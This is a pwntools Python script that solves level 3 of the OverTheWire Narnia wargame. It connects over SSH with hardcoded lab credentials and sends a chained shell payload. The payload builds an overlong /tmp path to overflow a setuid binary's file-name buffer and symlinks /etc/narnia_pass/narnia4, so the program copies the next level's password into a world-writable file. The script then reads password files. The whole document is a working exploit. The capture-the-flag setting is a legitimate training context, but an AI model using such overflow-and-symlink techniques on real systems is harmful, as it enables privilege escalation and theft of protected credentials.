from pwn import *

user ='narnia3'
host = 'narnia.labs.overthewire.org'
password = 'vaequeezee'
port=2226

file = "g147"
buff = "G"*27
path = "/tmp/"+buff+"/tmp/"+file
bin = "/narnia/./narnia3 "

payload = "rm /tmp/" + file
payload += ";rm -r /tmp/" + buff
payload += ";touch /tmp/" + file
payload += ";chmod 777 /tmp/" + file
payload += ";mkdir /tmp/" + buff
payload += ";cd /tmp/" + buff
payload += ";mkdir tmp"
payload += ";cd tmp/"
payload += ";ln -s /etc/narnia_pass/narnia4 ./" + file
payload += ";"+bin + file



machine = ssh(user=user, host=host, password=password, port=port)

bin = machine.shell("bash")
bin.sendline(payload)
bin.sendline('cat /etc/narnia*/narnia3')
bin.interactive()
